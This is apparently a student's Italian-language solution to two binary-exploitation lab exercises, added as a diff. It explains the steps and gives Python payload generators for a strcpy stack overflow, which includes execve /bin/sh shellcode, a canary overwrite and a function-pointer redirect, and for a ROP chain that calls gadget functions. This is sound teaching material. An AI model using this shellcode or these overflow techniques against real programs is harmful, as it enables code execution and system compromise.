@@ -1,0 +1,100 @@
+1) Per il esercizio dobbiamo sfruttare la vulnerabilità delle strcpy ottenere una shell.
+   In questo caso avremo un unico payload che ci servira per il buffer overflow prima in main
+   e successivamente in print_function. l'idea è quella di sovrascrivere fp in modo da puntare
+   a disable_security_function e quindi disabilitare il security check e con lo stresso payload   
+   in print_function sovrascrivere canary in modo da non eseguire exit(0) e infine sovrascrivere  
+   il return address puntando al nostro shellcode.
+	
+   Le distanze calcolate sono semplicemente le dimensioni dei buffer, tranne l'offset del return address di print_function.
+   Questo è stato calcolato inserendo una pattern dopo il valore di 'x' e tramite gdb si visualizza il valore di EIP dopo 
+   crash del sistema per Segmentation Fault.
+
+   Dunque il payload sarà:
+   1) Inizialmente inseriamo il nostro shellcode
+   2) Dopo inseriamo i caratteri necessari per arrivare a sovrascrivere il canary
+   3) Sovrascriviamo il canary con il valore di x (Trovato stampandolo a video)
+   4) Dopo inseriamo i caratteri necessari per arrivare a sovrascrivere il return address di print_function
+   5) Sovrascriviamo fp con l'indirizzio di disable_security_check
+   6) Dopo inseriamo i carattri necessari per arrivare a sovrascrivere fp con disable_security_check
+
+   
+# PAYLOAD
+# [shellcode][AA..AAA][x][BB..DDD][dst][CC..CCC][dsc]
+
+import struct 
+
+shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
+dsc = 0x804852b     # (gdb) p disable_security_check
+x = 1111638594      # stampa a video
+dst = 0xbffff134    # stampa a video
+
+payload = shellcode
+payload += "A"*(120-len(payload))
+payload += struct.pack("I",x)
+payload += "BBBBCCCCDDDD"
+payload += struct.pack("I",dst)
+payload += "Z"*(270-len(payload))
+payload += struct.pack("I",dsc)
+
+f = open("badfile","w")
+f.write(payload)
+f.close()
+
+
+2) Nel secondo esercizio l'obiettivo nel mio caso è stampare a video la scritta "Congratulation Antonio you win!".
+   Per farlo sfruttiamo la gets nel metodo vuln per sovrascrivere il return address e dunque eseguire le funzioni necessarie
+   ad ottenere la nostra stringa in 'str3' e stamparla tramite il metodo win.
+   In ordine vogliamo prima copiare str1 (Congratulation) in str3, dopo andiamo a concatenare prima il nome
+   passato tramite argomento e dopo str2 (you win!). Infine tramite win stampiamo str3.
+
+   Dunque il payload sarà:
+   1) Inseriamo i caratteri necessari per arrivare al return address di vuln
+   2) Inseriamo l'indirizzo di cpy_string, pop_pop_ret, str3 e str1
+   3) Inseriamo l'indirizzo di join_string, pop_pop_ret, str3 e argv[1]
+   4) Inseriamo l'indirizzo di join_string, pop_pop_ret, str3 e str2
+   5) Infine inseriamo l'indirizzo di win
+
+
+# PAYLOAD
+# [AA..AAA][cpy ...][join ...][join ...][win]
+
+import struct
+
+cpy = 0x804851a           # (gdb) p cpy_string
+join = 0x804855b          # (gdb) p join_string
+win = 0x804859c           # (gdb) p win
+pop_pop_ret = 0x080486aa  # ROPgadgets --binary ./rop-exam --only "pop|ret"
+str1 = 0x0804a060         # (gdb) info var str1
+str2 = 0x0804a084	  # (gdb) info var str1
+str3 = 0x0804a0a0         # (gdb) info var str1
+arg = 0xbffff4f5          # Stampa a video
+
+payload = "A"*148         # (gdb) patter create 160 file 
+                          #       r < file
+                          #       pattern search
+
+payload += struct.pack("I", cpy)
+payload += struct.pack("I",pop_pop_ret)
+payload += struct.pack("I",str3)
+payload += struct.pack("I",str1)
+
+payload += struct.pack("I", join)
+payload += struct.pack("I", pop_pop_ret)
+payload += struct.pack("I", str3)
+payload += struct.pack("I", arg)
+
+payload += struct.pack("I", join)
+payload += struct.pack("I", pop_pop_ret)
+payload += struct.pack("I", str3)
+payload += struct.pack("I", str2)
+
+payload += struct.pack("I",win)
+ 
+f = open("badfile","w")
+f.write(payload)
+f.close()
+
+
+
+
+
